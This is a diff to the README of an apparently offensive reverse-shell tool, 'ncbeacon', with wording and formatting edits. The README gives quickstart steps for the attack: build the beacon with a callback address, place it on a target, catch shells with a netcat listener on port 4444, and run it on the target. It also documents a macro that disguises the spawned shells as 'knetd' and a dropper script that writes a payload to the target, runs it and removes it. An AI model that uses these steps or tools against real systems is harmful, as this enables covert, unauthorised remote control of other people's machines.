@@ -16,17 +16,20 @@ you used this for illegal purposes.
 
 Quickstart
 ----------
-1. Build it (replacing the `CALLBACK_ADDRESS` with your address
+1. Build it (replacing the `CALLBACK_ADDRESS` with the correct address)
 ```sh
 cc -O2 -DCBADDR=CALLBACK_ADDRESS -o ncbeacon ncbeacon.c
 ```
 2. Put it on target
+```sh
+# This one's up to you
+```
 3. Set up netcat to catch it
 ```sh
 rlwrap nc -nvlp 4444
 ```
 4. Start it, on target
-```
+```sh
 ./ncbeacon
 ```
 
@@ -36,11 +39,11 @@ There are a few compile-time settings controlled by macros (i.e. -DNAME=VALUE)
 
 Macro    | Required | Default | Description
 ---------|----------|---------|------------
-`CBADDR` | *Yes*    | _None_  | Callback Address
-`CBPORT` | _No_     | 4444    | Callback Port
-`CBWAIT` | _No_     | 5       | Time between callbacks, in seconds
-`SHNAME` | _No_     | `knetd` | Name (`argv[0]`) of spawned shells
-`DEBUG`  | _No_     | _Unset_ | If set, logs errors and prevents backgrounding
+`CBADDR` | **Yes**  | _None_  | Callback Address
+`CBPORT` |  No      | `4444`  | Callback Port
+`CBWAIT` |  No      | `5`     | Time between callbacks, in seconds
+`SHNAME` |  No      | `knetd` | Name (`argv[0]`) of spawned shells
+`DEBUG`  |  No      | _Unset_ | If set, logs errors and prevents backgrounding
 
 Excessive Process Spawning
 --------------------------
@@ -60,7 +63,7 @@ cc -O2 -o nccatch nccatch.c
 Give it either a port or an address and port, like `./nccatch 4444` or
 `./nccatch 127.0.0.1 4444`.
 
-OpSec Considerations
+OPSEC Considerations
 --------------------
 This is bad.
 
@@ -76,10 +79,10 @@ very good reason to.
 
 Dropper
 -------
-A script to generate a shell script named [bin2dropper.sh](./bin2dropper.sh)
-which drops and runs a payload is included in this repository.  It takes a
-payload and writes to stdout a script which will drop the payload, run it, and
-remove it.  Prerequisites on target are openssl and gunzip.
+The included [bin2dropper.sh](./bin2dropper.sh) will generate a shell script
+which drops and runs a payload.  It takes a payload file and writes to stdout a
+script which will drop the payload, run it, and remove it.  Prerequisites on
+target are openssl and gunzip.
 
 Example:
 ```sh
